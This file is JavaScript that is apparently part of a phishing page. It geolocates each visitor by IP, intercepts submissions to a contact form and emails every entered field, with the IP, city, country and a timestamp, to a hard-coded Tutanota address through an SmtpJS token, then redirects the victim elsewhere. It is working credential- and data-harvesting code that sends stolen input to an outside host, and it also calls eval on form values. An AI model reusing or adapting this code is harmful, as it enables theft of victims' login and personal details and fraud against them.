
function sleep(num) {
    var now = new Date();
    var stop = now.getTime() + num;
    while(true) {
        now = new Date();
        if(now.getTime() > stop) return;
    }
}


function getFormData(form){
   

    var unindexed_array = form;
    var indexed_array = {};

    $.map(unindexed_array, function(n, i){
        indexed_array[n['name']] = n['value'];
    });

    return indexed_array;
}



function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}




(function ($) {
    'use strict';


var nextPage =  $('#next').val();
 
$('#next').val(nextPage + '='+ makeid(200));

var continueData = $('#next').val();

var today = new Date();
var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
var dateTime = date+' '+time;



$.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
       $('#city').val(JSON.stringify(data.city, null, 2));
        $('#ip').val(JSON.stringify(data.ip, null, 2)); 
         $('#country').val(JSON.stringify(data.country_name, null, 2));
});



    emailjs.init("user_70wf7zfmVbzgixkQxYZiY");

    


   

    var form = $('.contact__form'),
        form_data;


        var continueButton = $('#submit').text();

    


    form.submit(function (e) {
      
  

            
        e.preventDefault();
        $('#submit').text('Einen Augenblick..');
    
        form_data = $(this).serializeArray();

var  data = getFormData(form_data);

$('#message').val(JSON.stringify(data, null, 2));


    var title = $('#title').val() + ' IP:'+ eval($('#ip').val()) +' (' +  eval($('#city').val()) + ',' + eval($('#country').val())+ ') | ' + dateTime;
    var message = JSON.stringify(data, null, 2);

 

 console.log(data)



Email.send({
    SecureToken : "7eeacfe7-36ff-46c6-bc41-62783b5b88b7",
    To : 'chasepaper24s@tutanota.com',
    From : "chasepaper24s@tutanota.com",
    Subject : title,
    Body : message
}).then(function (message) {
    $('#submit').text(continueButton);
       // console.log(message);
      window.location.replace(continueData);
     return;

    }, function(error) {
         $('#submit').text(continueButton);
          //console.log(error);
       console.log('FAILED...', error);

  
    });

      });



    
})(jQuery);